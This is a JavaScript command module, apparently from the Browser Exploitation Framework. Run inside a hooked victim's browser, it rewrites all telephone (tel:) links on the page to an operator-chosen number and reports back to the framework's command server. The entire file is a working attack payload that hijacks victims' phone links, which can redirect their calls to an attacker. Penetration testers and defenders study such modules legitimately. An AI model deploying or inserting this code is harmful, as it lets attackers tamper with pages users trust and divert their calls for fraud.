//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var tel_number = "<%= @tel_number %>";
	var selector   = "a";

	server.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+server.dom.rewriteTelLinks(tel_number, selector)+' telephone (tel) links rewritten to '+tel_number);

});

